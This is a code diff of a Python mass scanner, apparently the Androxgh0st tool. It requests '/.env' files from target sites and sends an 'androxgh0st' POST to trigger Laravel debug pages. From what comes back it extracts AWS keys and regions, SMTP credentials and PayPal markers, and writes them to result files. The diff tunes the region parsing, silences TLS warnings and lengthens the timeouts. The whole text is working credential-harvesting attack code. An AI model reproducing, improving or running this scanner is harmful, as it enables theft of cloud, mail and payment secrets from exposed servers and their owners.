@@ -2,6 +2,7 @@ import requests
 from re import findall as reg
 from colorama import init
 from multiprocessing import Pool
+import urllib3
 
 class GET_SMTP(object):
 
@@ -10,6 +11,19 @@ class GET_SMTP(object):
         self.thread = thread
 
     init(convert=True)
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    
+    def get_paypal(self, response, url):
+        if 'PAYPAL_' in response:
+            save = open('Results/paypal_sandbox.txt','a')
+            save.write(url+'\n')
+            save.close()
+            return True
+        else:
+            return False
+
+    def get_aws_region(self, response):
     list_region = '''us-east-1
     us-east-2
     us-west-1
@@ -31,20 +45,8 @@ class GET_SMTP(object):
     eu-north-1
     me-south-1
     sa-east-1'''
-    pid_restore = '.nero_swallowtail'
-    
-    def get_paypal(self, response, url):
-        if 'PAYPAL_' in response:
-            save = open('Results/paypal_sandbox.txt','a')
-            save.write(url+'\n')
-            save.close()
-            return True
-        else:
-            return False
-
-    def get_aws_region(self, response):
         reg = False
-        for region in self.list_region.splitlines():
+        for region in list_region.splitlines():
             if str(region) in response:
                 return region
                 break
@@ -111,11 +113,7 @@ class GET_SMTP(object):
                     except:
                         aws_sec = ''
                     try:
-                        get_region = self.get_aws_region(response)
-                        if get_region:
-                            aws_reg = get_region
-                        else:
-                            aws_reg = ''
+                        aws_reg = reg("\nAWS_REGION=(.*?)\n", response)[0]
                     except:
                         aws_reg = ''
                     try:
@@ -133,11 +131,7 @@ class GET_SMTP(object):
                     except:
                         aws_sec = ''
                     try:
-                        get_region = self.get_aws_region(response)
-                        if get_region:
-                            aws_reg = get_region
-                        else:
-                            aws_reg = ''
+                        aws_reg = reg("<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                     except:
                         aws_reg = ''
                     try:
@@ -415,11 +409,11 @@ class GET_SMTP(object):
         try:
             text = '\033[32;1m#\033[0m '+url
             headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
-            get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
+            get_source = requests.get(url+"/.env", headers=headers, timeout=15, verify=False, allow_redirects=False).text
             if "APP_KEY=" in get_source:
                 resp = get_source
             else:
-                get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
+                get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=15, verify=False, allow_redirects=False).text
                 if "<td>APP_KEY</td>" in get_source:
                     resp = get_source
             if resp:
